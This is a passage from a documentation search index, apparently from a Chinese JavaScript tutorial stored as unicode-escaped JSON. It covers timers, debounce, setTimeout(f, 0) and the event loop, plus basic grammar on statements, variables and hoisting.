\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u8c03\u7528 setTimeout \uff0c\u5f97\u5230\u4e00\u4e2a\u8ba1\u7b97\u5668\u7f16\u53f7\uff0c\u7136\u540e\u628a\u7f16\u53f7\u6bd4\u5b83\u5c0f\u7684\u8ba1\u6570\u5668\u5168\u90e8\u53d6\u6d88\u3002","title":"clearTimeout()\uff0cclearInterval()"},{"location":"async/timer/#debounce","text":"\u6709\u65f6\uff0c\u6211\u4eec\u4e0d\u5e0c\u671b\u56de\u8c03\u51fd\u6570\u88ab\u9891\u7e41\u8c03\u7528\u3002\u6bd4\u5982\uff0c\u7528\u6237\u586b\u5165\u7f51\u9875\u8f93\u5165\u6846\u7684\u5185\u5bb9\uff0c\u5e0c\u671b\u901a\u8fc7 Ajax \u65b9\u6cd5\u4f20\u56de\u670d\u52a1\u5668\uff0cjQuery \u7684\u5199\u6cd5\u5982\u4e0b\u3002 1 $ ( 'textarea' ). on ( 'keydown' , ajaxAction ); \u8fd9\u6837\u5199\u6709\u4e00\u4e2a\u5f88\u5927\u7684\u7f3a\u70b9\uff0c\u5c31\u662f\u5982\u679c\u7528\u6237\u8fde\u7eed\u51fb\u952e\uff0c\u5c31\u4f1a\u8fde\u7eed\u89e6\u53d1 keydown \u4e8b\u4ef6\uff0c\u9020\u6210\u5927\u91cf\u7684 Ajax \u901a\u4fe1\u3002\u8fd9\u662f\u4e0d\u5fc5\u8981\u7684\uff0c\u800c\u4e14\u5f88\u53ef\u80fd\u4ea7\u751f\u6027\u80fd\u95ee\u9898\u3002\u6b63\u786e\u7684\u505a\u6cd5\u5e94\u8be5\u662f\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u95e8\u69db\u503c\uff0c\u8868\u793a\u4e24\u6b21 Ajax \u901a\u4fe1\u7684\u6700\u5c0f\u95f4\u9694\u65f6\u95f4\u3002\u5982\u679c\u5728\u95f4\u9694\u65f6\u95f4\u5185\uff0c\u53d1\u751f\u65b0\u7684 keydown \u4e8b\u4ef6\uff0c\u5219\u4e0d\u89e6\u53d1 Ajax \u901a\u4fe1\uff0c\u5e76\u4e14\u91cd\u65b0\u5f00\u59cb\u8ba1\u65f6\u3002\u5982\u679c\u8fc7\u4e86\u6307\u5b9a\u65f6\u95f4\uff0c\u6ca1\u6709\u53d1\u751f\u65b0\u7684 keydown \u4e8b\u4ef6\uff0c\u518d\u5c06\u6570\u636e\u53d1\u9001\u51fa\u53bb\u3002 \u8fd9\u79cd\u505a\u6cd5\u53eb\u505a debounce\uff08\u9632\u6296\u52a8\uff09\u3002\u5047\u5b9a\u4e24\u6b21 Ajax \u901a\u4fe1\u7684\u95f4\u9694\u4e0d\u5f97\u5c0f\u4e8e2500\u6beb\u79d2\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u6539\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ( 'textarea' ). on ( 'keydown' , debounce ( ajaxAction , 2500 )); function debounce ( fn , delay ){ var timer = null ; // \u58f0\u660e\u8ba1\u65f6\u5668 return function () { var context = this ; var args = arguments ; clearTimeout ( timer ); timer = setTimeout ( function () { fn . apply ( context , args ); }, delay ); }; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u8981\u57282500\u6beb\u79d2\u4e4b\u5185\uff0c\u7528\u6237\u518d\u6b21\u51fb\u952e\uff0c\u5c31\u4f1a\u53d6\u6d88\u4e0a\u4e00\u6b21\u7684\u5b9a\u65f6\u5668\uff0c\u7136\u540e\u518d\u65b0\u5efa\u4e00\u4e2a\u5b9a\u65f6\u5668\u3002\u8fd9\u6837\u5c31\u4fdd\u8bc1\u4e86\u56de\u8c03\u51fd\u6570\u4e4b\u95f4\u7684\u8c03\u7528\u95f4\u9694\uff0c\u81f3\u5c11\u662f2500\u6beb\u79d2\u3002","title":"\u5b9e\u4f8b\uff1adebounce \u51fd\u6570"},{"location":"async/timer/#_2","text":"setTimeout \u548c setInterval \u7684\u8fd0\u884c\u673a\u5236\uff0c\u662f\u5c06\u6307\u5b9a\u7684\u4ee3\u7801\u79fb\u51fa\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\uff0c\u7b49\u5230\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\uff0c\u518d\u68c0\u67e5\u662f\u5426\u5230\u4e86\u6307\u5b9a\u65f6\u95f4\u3002\u5982\u679c\u5230\u4e86\uff0c\u5c31\u6267\u884c\u5bf9\u5e94\u7684\u4ee3\u7801\uff1b\u5982\u679c\u4e0d\u5230\uff0c\u5c31\u7ee7\u7eed\u7b49\u5f85\u3002 \u8fd9\u610f\u5473\u7740\uff0c setTimeout \u548c setInterval \u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\uff0c\u5fc5\u987b\u7b49\u5230\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\u7684\u6240\u6709\u540c\u6b65\u4efb\u52a1\u90fd\u6267\u884c\u5b8c\uff0c\u624d\u4f1a\u5f00\u59cb\u6267\u884c\u3002\u7531\u4e8e\u524d\u9762\u7684\u4efb\u52a1\u5230\u5e95\u9700\u8981\u591a\u5c11\u65f6\u95f4\u6267\u884c\u5b8c\uff0c\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u6240\u4ee5\u6ca1\u6709\u529e\u6cd5\u4fdd\u8bc1\uff0c setTimeout \u548c setInterval \u6307\u5b9a\u7684\u4efb\u52a1\uff0c\u4e00\u5b9a\u4f1a\u6309\u7167\u9884\u5b9a\u65f6\u95f4\u6267\u884c\u3002 1 2 setTimeout ( someTask , 100 ); veryLongTask (); \u4e0a\u9762\u4ee3\u7801\u7684 setTimeout \uff0c\u6307\u5b9a100\u6beb\u79d2\u4ee5\u540e\u8fd0\u884c\u4e00\u4e2a\u4efb\u52a1\u3002\u4f46\u662f\uff0c\u5982\u679c\u540e\u9762\u7684 veryLongTask \u51fd\u6570\uff08\u540c\u6b65\u4efb\u52a1\uff09\u8fd0\u884c\u65f6\u95f4\u975e\u5e38\u957f\uff0c\u8fc7\u4e86100\u6beb\u79d2\u8fd8\u65e0\u6cd5\u7ed3\u675f\uff0c\u90a3\u4e48\u88ab\u63a8\u8fdf\u8fd0\u884c\u7684 someTask \u5c31\u53ea\u6709\u7b49\u7740\uff0c\u7b49\u5230 veryLongTask \u8fd0\u884c\u7ed3\u675f\uff0c\u624d\u8f6e\u5230\u5b83\u6267\u884c\u3002 \u518d\u770b\u4e00\u4e2a setInterval \u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 setInterval ( function () { console . log ( 2 ); }, 1000 ); sleep ( 3000 ); function sleep ( ms ) { var start = Date . now (); while (( Date . now () - start ) < ms ) { } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setInterval \u8981\u6c42\u6bcf\u96941000\u6beb\u79d2\uff0c\u5c31\u8f93\u51fa\u4e00\u4e2a2\u3002\u4f46\u662f\uff0c\u7d27\u63a5\u7740\u7684 sleep \u8bed\u53e5\u9700\u89813000\u6beb\u79d2\u624d\u80fd\u5b8c\u6210\uff0c\u90a3\u4e48 setInterval \u5c31\u5fc5\u987b\u63a8\u8fdf\u52303000\u6beb\u79d2\u4e4b\u540e\u624d\u5f00\u59cb\u751f\u6548\u3002\u6ce8\u610f\uff0c\u751f\u6548\u540e setInterval \u4e0d\u4f1a\u4ea7\u751f\u7d2f\u79ef\u6548\u5e94\uff0c\u5373\u4e0d\u4f1a\u4e00\u4e0b\u5b50\u8f93\u51fa\u4e09\u4e2a2\uff0c\u800c\u662f\u53ea\u4f1a\u8f93\u51fa\u4e00\u4e2a2\u3002","title":"\u8fd0\u884c\u673a\u5236"},{"location":"async/timer/#settimeoutf-0","text":"","title":"setTimeout(f, 0)"},{"location":"async/timer/#_3","text":"setTimeout \u7684\u4f5c\u7528\u662f\u5c06\u4ee3\u7801\u63a8\u8fdf\u5230\u6307\u5b9a\u65f6\u95f4\u6267\u884c\uff0c\u5982\u679c\u6307\u5b9a\u65f6\u95f4\u4e3a 0 \uff0c\u5373 setTimeout(f, 0) \uff0c\u90a3\u4e48\u4f1a\u7acb\u523b\u6267\u884c\u5417\uff1f \u7b54\u6848\u662f\u4e0d\u4f1a\u3002\u56e0\u4e3a\u4e0a\u4e00\u8282\u8bf4\u8fc7\uff0c\u5fc5\u987b\u8981\u7b49\u5230\u5f53\u524d\u811a\u672c\u7684\u540c\u6b65\u4efb\u52a1\uff0c\u5168\u90e8\u5904\u7406\u5b8c\u4ee5\u540e\uff0c\u624d\u4f1a\u6267\u884c setTimeout \u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570 f \u3002\u4e5f\u5c31\u662f\u8bf4\uff0c setTimeout(f, 0) \u4f1a\u5728\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\u4e00\u5f00\u59cb\u5c31\u6267\u884c\u3002 1 2 3 4 5 6 setTimeout ( function () { console . log ( 1 ); }, 0 ); console . log ( 2 ); // 2 // 1 \u4e0a\u9762\u4ee3\u7801\u5148\u8f93\u51fa 2 \uff0c\u518d\u8f93\u51fa 1 \u3002\u56e0\u4e3a 2 \u662f\u540c\u6b65\u4efb\u52a1\uff0c\u5728\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\u6267\u884c\uff0c\u800c 1 \u662f\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\u6267\u884c\u3002 \u603b\u4e4b\uff0c setTimeout(f, 0) \u8fd9\u79cd\u5199\u6cd5\u7684\u76ee\u7684\u662f\uff0c\u5c3d\u53ef\u80fd\u65e9\u5730\u6267\u884c f \uff0c\u4f46\u662f\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u7acb\u523b\u5c31\u6267\u884c f \u3002 \u5b9e\u9645\u4e0a\uff0c setTimeout(f, 0) \u4e0d\u4f1a\u771f\u7684\u57280\u6beb\u79d2\u4e4b\u540e\u8fd0\u884c\uff0c\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u6709\u4e0d\u540c\u7684\u5b9e\u73b0\u3002\u4ee5 Edge \u6d4f\u89c8\u5668\u4e3a\u4f8b\uff0c\u4f1a\u7b49\u52304\u6beb\u79d2\u4e4b\u540e\u8fd0\u884c\u3002\u5982\u679c\u7535\u8111\u6b63\u5728\u4f7f\u7528\u7535\u6c60\u4f9b\u7535\uff0c\u4f1a\u7b49\u523016\u6beb\u79d2\u4e4b\u540e\u8fd0\u884c\uff1b\u5982\u679c\u7f51\u9875\u4e0d\u5728\u5f53\u524d Tab \u9875\uff0c\u4f1a\u63a8\u8fdf\u52301000\u6beb\u79d2\uff081\u79d2\uff09\u4e4b\u540e\u8fd0\u884c\u3002\u8fd9\u6837\u662f\u4e3a\u4e86\u8282\u7701\u7cfb\u7edf\u8d44\u6e90\u3002","title":"\u542b\u4e49"},{"location":"async/timer/#_4","text":"setTimeout(f, 0) \u6709\u51e0\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u7528\u9014\u3002\u5b83\u7684\u4e00\u5927\u5e94\u7528\u662f\uff0c\u53ef\u4ee5\u8c03\u6574\u4e8b\u4ef6\u7684\u53d1\u751f\u987a\u5e8f\u3002\u6bd4\u5982\uff0c\u7f51\u9875\u5f00\u53d1\u4e2d\uff0c\u67d0\u4e2a\u4e8b\u4ef6\u5148\u53d1\u751f\u5728\u5b50\u5143\u7d20\uff0c\u7136\u540e\u5192\u6ce1\u5230\u7236\u5143\u7d20\uff0c\u5373\u5b50\u5143\u7d20\u7684\u4e8b\u4ef6\u56de\u8c03\u51fd\u6570\uff0c\u4f1a\u65e9\u4e8e\u7236\u5143\u7d20\u7684\u4e8b\u4ef6\u56de\u8c03\u51fd\u6570\u89e6\u53d1\u3002\u5982\u679c\uff0c\u60f3\u8ba9\u7236\u5143\u7d20\u7684\u4e8b\u4ef6\u56de\u8c03\u51fd\u6570\u5148\u53d1\u751f\uff0c\u5c31\u8981\u7528\u5230 setTimeout(f, 0) \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"button\" id=\"myButton\" value=\"click\"> var input = document . getElementById ( 'myButton' ); input . onclick = function A () { setTimeout ( function B () { input . value += ' input' ; }, 0 ) }; document . body . onclick = function C () { input . value += ' body' }; \u4e0a\u9762\u4ee3\u7801\u5728\u70b9\u51fb\u6309\u94ae\u540e\uff0c\u5148\u89e6\u53d1\u56de\u8c03\u51fd\u6570 A \uff0c\u7136\u540e\u89e6\u53d1\u51fd\u6570 C \u3002\u51fd\u6570 A \u4e2d\uff0c setTimeout \u5c06\u51fd\u6570 B \u63a8\u8fdf\u5230\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\u6267\u884c\uff0c\u8fd9\u6837\u5c31\u8d77\u5230\u4e86\uff0c\u5148\u89e6\u53d1\u7236\u5143\u7d20\u7684\u56de\u8c03\u51fd\u6570 C \u7684\u76ee\u7684\u4e86\u3002 \u53e6\u4e00\u4e2a\u5e94\u7528\u662f\uff0c\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u56de\u8c03\u51fd\u6570\uff0c\u901a\u5e38\u5728\u6d4f\u89c8\u5668\u7684\u9ed8\u8ba4\u52a8\u4f5c\u4e4b\u524d\u89e6\u53d1\u3002\u6bd4\u5982\uff0c\u7528\u6237\u5728\u8f93\u5165\u6846\u8f93\u5165\u6587\u672c\uff0c keypress \u4e8b\u4ef6\u4f1a\u5728\u6d4f\u89c8\u5668\u63a5\u6536\u6587\u672c\u4e4b\u524d\u89e6\u53d1\u3002\u56e0\u6b64\uff0c\u4e0b\u9762\u7684\u56de\u8c03\u51fd\u6570\u662f\u8fbe\u4e0d\u5230\u76ee\u7684\u7684\u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"text\" id=\"input-box\"> document . getElementById ( 'input-box' ). onkeypress = function ( event ) { this . value = this . value . toUpperCase (); } \u4e0a\u9762\u4ee3\u7801\u60f3\u5728\u7528\u6237\u6bcf\u6b21\u8f93\u5165\u6587\u672c\u540e\uff0c\u7acb\u5373\u5c06\u5b57\u7b26\u8f6c\u4e3a\u5927\u5199\u3002\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u5b83\u53ea\u80fd\u5c06\u672c\u6b21\u8f93\u5165\u524d\u7684\u5b57\u7b26\u8f6c\u4e3a\u5927\u5199\uff0c\u56e0\u4e3a\u6d4f\u89c8\u5668\u6b64\u65f6\u8fd8\u6ca1\u63a5\u6536\u5230\u65b0\u7684\u6587\u672c\uff0c\u6240\u4ee5 this.value \u53d6\u4e0d\u5230\u6700\u65b0\u8f93\u5165\u7684\u90a3\u4e2a\u5b57\u7b26\u3002\u53ea\u6709\u7528 setTimeout \u6539\u5199\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u624d\u80fd\u53d1\u6325\u4f5c\u7528\u3002 1 2 3 4 5 6 document . getElementById ( 'input-box' ). onkeypress = function () { var self = this ; setTimeout ( function () { self . value = self . value . toUpperCase (); }, 0 ); } \u4e0a\u9762\u4ee3\u7801\u5c06\u4ee3\u7801\u653e\u5165 setTimeout \u4e4b\u4e2d\uff0c\u5c31\u80fd\u4f7f\u5f97\u5b83\u5728\u6d4f\u89c8\u5668\u63a5\u6536\u5230\u6587\u672c\u4e4b\u540e\u89e6\u53d1\u3002 \u7531\u4e8e setTimeout(f, 0) \u5b9e\u9645\u4e0a\u610f\u5473\u7740\uff0c\u5c06\u4efb\u52a1\u653e\u5230\u6d4f\u89c8\u5668\u6700\u65e9\u53ef\u5f97\u7684\u7a7a\u95f2\u65f6\u6bb5\u6267\u884c\uff0c\u6240\u4ee5\u90a3\u4e9b\u8ba1\u7b97\u91cf\u5927\u3001\u8017\u65f6\u957f\u7684\u4efb\u52a1\uff0c\u5e38\u5e38\u4f1a\u88ab\u653e\u5230\u51e0\u4e2a\u5c0f\u90e8\u5206\uff0c\u5206\u522b\u653e\u5230 setTimeout(f, 0) \u91cc\u9762\u6267\u884c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var div = document . getElementsByTagName ( 'div' )[ 0 ]; // \u5199\u6cd5\u4e00 for ( var i = 0xA00000 ; i < 0xFFFFFF ; i ++ ) { div . style . backgroundColor = '#' + i . toString ( 16 ); } // \u5199\u6cd5\u4e8c var timer ; var i = 0x100000 ; function func () { timer = setTimeout ( func , 0 ); div . style . backgroundColor = '#' + i . toString ( 16 ); if ( i ++ == 0xFFFFFF ) clearTimeout ( timer ); } timer = setTimeout ( func , 0 ); \u4e0a\u9762\u4ee3\u7801\u6709\u4e24\u79cd\u5199\u6cd5\uff0c\u90fd\u662f\u6539\u53d8\u4e00\u4e2a\u7f51\u9875\u5143\u7d20\u7684\u80cc\u666f\u8272\u3002\u5199\u6cd5\u4e00\u4f1a\u9020\u6210\u6d4f\u89c8\u5668\u201c\u5835\u585e\u201d\uff0c\u56e0\u4e3a JavaScript \u6267\u884c\u901f\u5ea6\u8fdc\u9ad8\u4e8e DOM\uff0c\u4f1a\u9020\u6210\u5927\u91cf DOM \u64cd\u4f5c\u201c\u5806\u79ef\u201d\uff0c\u800c\u5199\u6cd5\u4e8c\u5c31\u4e0d\u4f1a\uff0c\u8fd9\u5c31\u662f setTimeout(f, 0) \u7684\u597d\u5904\u3002 \u53e6\u4e00\u4e2a\u4f7f\u7528\u8fd9\u79cd\u6280\u5de7\u7684\u4f8b\u5b50\u662f\u4ee3\u7801\u9ad8\u4eae\u7684\u5904\u7406\u3002\u5982\u679c\u4ee3\u7801\u5757\u5f88\u5927\uff0c\u4e00\u6b21\u6027\u5904\u7406\uff0c\u53ef\u80fd\u4f1a\u5bf9\u6027\u80fd\u9020\u6210\u5f88\u5927\u7684\u538b\u529b\uff0c\u90a3\u4e48\u5c06\u5176\u5206\u6210\u4e00\u4e2a\u4e2a\u5c0f\u5757\uff0c\u4e00\u6b21\u5904\u7406\u4e00\u5757\uff0c\u6bd4\u5982\u5199\u6210 setTimeout(highlightNext, 50) \u7684\u6837\u5b50\uff0c\u6027\u80fd\u538b\u529b\u5c31\u4f1a\u51cf\u8f7b\u3002","title":"\u5e94\u7528"},{"location":"basic/grammar/","text":"JavaScript \u7684\u57fa\u672c\u8bed\u6cd5 \u00b6 \u8bed\u53e5 \u00b6 JavaScript \u7a0b\u5e8f\u7684\u6267\u884c\u5355\u4f4d\u4e3a\u884c\uff08line\uff09\uff0c\u4e5f\u5c31\u662f\u4e00\u884c\u4e00\u884c\u5730\u6267\u884c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6bcf\u4e00\u884c\u5c31\u662f\u4e00\u4e2a\u8bed\u53e5\u3002 \u8bed\u53e5\uff08statement\uff09\u662f\u4e3a\u4e86\u5b8c\u6210\u67d0\u79cd\u4efb\u52a1\u800c\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u6bd4\u5982\u4e0b\u9762\u5c31\u662f\u4e00\u884c\u8d4b\u503c\u8bed\u53e5\u3002 1 var a = 1 + 3 ; \u8fd9\u6761\u8bed\u53e5\u5148\u7528 var \u547d\u4ee4\uff0c\u58f0\u660e\u4e86\u53d8\u91cf a \uff0c\u7136\u540e\u5c06 1 + 3 \u7684\u8fd0\u7b97\u7ed3\u679c\u8d4b\u503c\u7ed9\u53d8\u91cf a \u3002 1 + 3 \u53eb\u505a\u8868\u8fbe\u5f0f\uff08expression\uff09\uff0c\u6307\u4e00\u4e2a\u4e3a\u4e86\u5f97\u5230\u8fd4\u56de\u503c\u7684\u8ba1\u7b97\u5f0f\u3002\u8bed\u53e5\u548c\u8868\u8fbe\u5f0f\u7684\u533a\u522b\u5728\u4e8e\uff0c\u524d\u8005\u4e3b\u8981\u4e3a\u4e86\u8fdb\u884c\u67d0\u79cd\u64cd\u4f5c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u9700\u8981\u8fd4\u56de\u503c\uff1b\u540e\u8005\u5219\u662f\u4e3a\u4e86\u5f97\u5230\u8fd4\u56de\u503c\uff0c\u4e00\u5b9a\u4f1a\u8fd4\u56de\u4e00\u4e2a\u503c\u3002\u51e1\u662f JavaScript \u8bed\u8a00\u4e2d\u9884\u671f\u4e3a\u503c\u7684\u5730\u65b9\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u8868\u8fbe\u5f0f\u3002\u6bd4\u5982\uff0c\u8d4b\u503c\u8bed\u53e5\u7684\u7b49\u53f7\u53f3\u8fb9\uff0c\u9884\u671f\u662f\u4e00\u4e2a\u503c\uff0c\u56e0\u6b64\u53ef\u4ee5\u653e\u7f6e\u5404\u79cd\u8868\u8fbe\u5f0f\u3002 \u8bed\u53e5\u4ee5\u5206\u53f7\u7ed3\u5c3e\uff0c\u4e00\u4e2a\u5206\u53f7\u5c31\u8868\u793a\u4e00\u4e2a\u8bed\u53e5\u7ed3\u675f\u3002\u591a\u4e2a\u8bed\u53e5\u53ef\u4ee5\u5199\u5728\u4e00\u884c\u5185\u3002 1 var a = 1 + 3 ; var b = 'abc' ; \u5206\u53f7\u524d\u9762\u53ef\u4ee5\u6ca1\u6709\u4efb\u4f55\u5185\u5bb9\uff0cJavaScript \u5f15\u64ce\u5c06\u5176\u89c6\u4e3a\u7a7a\u8bed\u53e5\u3002 1 ;;; \u4e0a\u9762\u7684\u4ee3\u7801\u5c31\u8868\u793a3\u4e2a\u7a7a\u8bed\u53e5\u3002 \u8868\u8fbe\u5f0f\u4e0d\u9700\u8981\u5206\u53f7\u7ed3\u5c3e\u3002\u4e00\u65e6\u5728\u8868\u8fbe\u5f0f\u540e\u9762\u6dfb\u52a0\u5206\u53f7\uff0c\u5219 JavaScript \u5f15\u64ce\u5c31\u5c06\u8868\u8fbe\u5f0f\u89c6\u4e3a\u8bed\u53e5\uff0c\u8fd9\u6837\u4f1a\u4ea7\u751f\u4e00\u4e9b\u6ca1\u6709\u4efb\u4f55\u610f\u4e49\u7684\u8bed\u53e5\u3002 1 2 1 + 3 ; 'abc' ; \u4e0a\u9762\u4e24\u884c\u8bed\u53e5\u53ea\u662f\u5355\u7eaf\u5730\u4ea7\u751f\u4e00\u4e2a\u503c\uff0c\u5e76\u6ca1\u6709\u4efb\u4f55\u5b9e\u9645\u7684\u610f\u4e49\u3002 \u53d8\u91cf \u00b6 \u6982\u5ff5 \u00b6 \u53d8\u91cf\u662f\u5bf9\u201c\u503c\u201d\u7684\u5177\u540d\u5f15\u7528\u3002\u53d8\u91cf\u5c31\u662f\u4e3a\u201c\u503c\u201d\u8d77\u540d\uff0c\u7136\u540e\u5f15\u7528\u8fd9\u4e2a\u540d\u5b57\uff0c\u5c31\u7b49\u540c\u4e8e\u5f15\u7528\u8fd9\u4e2a\u503c\u3002\u53d8\u91cf\u7684\u540d\u5b57\u5c31\u662f\u53d8\u91cf\u540d\u3002 1 var a = 1 ; \u4e0a\u9762\u7684\u4ee3\u7801\u5148\u58f0\u660e\u53d8\u91cf a \uff0c\u7136\u540e\u5728\u53d8\u91cf a \u4e0e\u6570\u503c1\u4e4b\u95f4\u5efa\u7acb\u5f15\u7528\u5173\u7cfb\uff0c\u79f0\u4e3a\u5c06\u6570\u503c1\u201c\u8d4b\u503c\u201d\u7ed9\u53d8\u91cf a \u3002\u4ee5\u540e\uff0c\u5f15\u7528\u53d8\u91cf\u540d a \u5c31\u4f1a\u5f97\u5230\u6570\u503c1\u3002\u6700\u524d\u9762\u7684 var \uff0c\u662f\u53d8\u91cf\u58f0\u660e\u547d\u4ee4\u3002\u5b83\u8868\u793a\u901a\u77e5\u89e3\u91ca\u5f15\u64ce\uff0c\u8981\u521b\u5efa\u4e00\u4e2a\u53d8\u91cf a \u3002 \u6ce8\u610f\uff0cJavaScript \u7684\u53d8\u91cf\u540d\u533a\u5206\u5927\u5c0f\u5199\uff0c A \u548c a \u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u53d8\u91cf\u3002 \u53d8\u91cf\u7684\u58f0\u660e\u548c\u8d4b\u503c\uff0c\u662f\u5206\u5f00\u7684\u4e24\u4e2a\u6b65\u9aa4\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u5c06\u5b83\u4eec\u5408\u5728\u4e86\u4e00\u8d77\uff0c\u5b9e\u9645\u7684\u6b65\u9aa4\u662f\u4e0b\u9762\u8fd9\u6837\u3002 1 2 var a ; a = 1 ; \u5982\u679c\u53ea\u662f\u58f0\u660e\u53d8\u91cf\u800c\u6ca1\u6709\u8d4b\u503c\uff0c\u5219\u8be5\u53d8\u91cf\u7684\u503c\u662f undefined \u3002 undefined \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u503c\uff0c\u8868\u793a\u201c\u65e0\u5b9a\u4e49\u201d\u3002 1 2 var a ; a // undefined \u5982\u679c\u53d8\u91cf\u8d4b\u503c\u7684\u65f6\u5019\uff0c\u5fd8\u4e86\u5199 var \u547d\u4ee4\uff0c\u8fd9\u6761\u8bed\u53e5\u4e5f\u662f\u6709\u6548\u7684\u3002 1 2 3 var a = 1 ; // \u57fa\u672c\u7b49\u540c a = 1 ; \u4f46\u662f\uff0c\u4e0d\u5199 var \u7684\u505a\u6cd5\uff0c\u4e0d\u5229\u4e8e\u8868\u8fbe\u610f\u56fe\uff0c\u800c\u4e14\u5bb9\u6613\u4e0d\u77e5\u4e0d\u89c9\u5730\u521b\u5efa\u5168\u5c40\u53d8\u91cf\uff0c\u6240\u4ee5\u5efa\u8bae\u603b\u662f\u4f7f\u7528 var \u547d\u4ee4\u58f0\u660e\u53d8\u91cf\u3002 \u5982\u679c\u4e00\u4e2a\u53d8\u91cf\u6ca1\u6709\u58f0\u660e\u5c31\u76f4\u63a5\u4f7f\u7528\uff0cJavaScript \u4f1a\u62a5\u9519\uff0c\u544a\u8bc9\u4f60\u53d8\u91cf\u672a\u5b9a\u4e49\u3002 1 2 x // ReferenceError: x is not defined \u4e0a\u9762\u4ee3\u7801\u76f4\u63a5\u4f7f\u7528\u53d8\u91cf x \uff0c\u7cfb\u7edf\u5c31\u62a5\u9519\uff0c\u544a\u8bc9\u4f60\u53d8\u91cf x \u6ca1\u6709\u58f0\u660e\u3002 \u53ef\u4ee5\u5728\u540c\u4e00\u6761 var \u547d\u4ee4\u4e2d\u58f0\u660e\u591a\u4e2a\u53d8\u91cf\u3002 1 var a , b ; JavaScript \u662f\u4e00\u79cd\u52a8\u6001\u7c7b\u578b\u8bed\u8a00\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53d8\u91cf\u7684\u7c7b\u578b\u6ca1\u6709\u9650\u5236\uff0c\u53d8\u91cf\u53ef\u4ee5\u968f\u65f6\u66f4\u6539\u7c7b\u578b\u3002 1 2 var a = 1 ; a = 'hello' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf a \u8d77\u5148\u88ab\u8d4b\u503c\u4e3a\u4e00\u4e2a\u6570\u503c\uff0c\u540e\u6765\u53c8\u88ab\u91cd\u65b0\u8d4b\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u7b2c\u4e8c\u6b21\u8d4b\u503c\u7684\u65f6\u5019\uff0c\u56e0\u4e3a\u53d8\u91cf a \u5df2\u7ecf\u5b58\u5728\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u4f7f\u7528 var \u547d\u4ee4\u3002 \u5982\u679c\u4f7f\u7528 var \u91cd\u65b0\u58f0\u660e\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u53d8\u91cf\uff0c\u662f\u65e0\u6548\u7684\u3002 1 2 3 var x = 1 ; var x ; x // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf x \u58f0\u660e\u4e86\u4e24\u6b21\uff0c\u7b2c\u4e8c\u6b21\u58f0\u660e\u662f\u65e0\u6548\u7684\u3002 \u4f46\u662f\uff0c\u5982\u679c\u7b2c\u4e8c\u6b21\u58f0\u660e\u7684\u65f6\u5019\u8fd8\u8fdb\u884c\u4e86\u8d4b\u503c\uff0c\u5219\u4f1a\u8986\u76d6\u6389\u524d\u9762\u7684\u503c\u3002 1 2 3 4 5 6 7 8 var x = 1 ; var x = 2 ; // \u7b49\u540c\u4e8e var x = 1 ; var x ; x = 2 ; \u53d8\u91cf\u63d0\u5347 \u00b6 JavaScript \u5f15\u64ce\u7684\u5de5\u4f5c\u65b9\u5f0f\u662f\uff0c\u5148\u89e3\u6790\u4ee3\u7801\uff0c\u83b7\u53d6\u6240\u6709\u88ab\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u7136\u540e\u518d\u4e00\u884c\u4e00\u884c\u5730\u8fd0\u884c\u3002\u8fd9\u9020\u6210\u7684\u7ed3\u679c\uff0c\u5c31\u662f\u6240\u6709\u7684\u53d8\u91cf\u7684\u58f0\u660e\u8bed\u53e5\uff0c\u90fd\u4f1a\u88ab\u63d0\u5347\u5230\u4ee3\u7801\u7684\u5934\u90e8\uff0c\u8fd9\u5c31\u53eb\u505a\u53d8\u91cf\u63d0\u5347\uff08hoisting\uff09\u3002 1 2 console . log ( a ); var a = 1 ; \u4e0a\u9762\u4ee3\u7801\u9996\u5148\u4f7f\u7528 console.log \u65b9\u6cd5\uff0c\u5728\u63a7\u5236\u53f0\uff08console\uff09\u663e\u793a\u53d8\u91cf a \u7684\u503c\u3002\u8fd9\u65f6\u53d8\u91cf a 